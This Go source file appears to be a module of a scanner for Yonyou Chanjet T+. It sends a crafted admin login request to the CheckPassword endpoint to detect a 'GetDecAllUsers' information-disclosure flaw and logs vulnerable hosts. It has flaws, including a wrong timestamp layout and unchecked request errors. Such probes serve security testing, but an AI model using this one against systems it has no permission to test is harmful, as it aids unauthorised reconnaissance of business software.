package Scan

import (
	"FoPoForYonyou2.0/Utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func GetDecAllUsersScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	GetDecAllUsers := "用友 畅捷通T+ GetDecAllUsers 信息泄露漏洞"
	urls := address + "/tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword"
	response, _ := client.Post(urls, "application/json", strings.NewReader("{\"AccountNum\": \"000\", \"UserName\": \"admin\", \"Password\": \"\", \"rdpYear\": \"2023\", \"rdpMonth\": \"5\", \"rdpDate\": \"17\", \"webServiceProcessID\": \"admin\", \"ali_csessionid\": \"\", \"ali_sig\": \"\", \"ali_token\": \"\", \"ali_scene\": \"\", \"role\": \"\", \"aqdKey\": \"\", \"fromWhere\": \"browser\", \"cardNo\": \"\"}"))
	defer response.Body.Close()

	// 读取响应内容
	body, _ := ioutil.ReadAll(response.Body)

	if strings.Contains(string(body), "error") && strings.Contains(string(body), "Login") && strings.Contains(string(body), "DTO") {
		result := GetDecAllUsers + "：" + urls
		//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result, filename)
		if err != nil {
			log.Println("保存结果到文件出错:", err)
		} else {

		}
		output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, GetDecAllUsers, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, GetDecAllUsers)
		fmt.Println(output)
	}
}
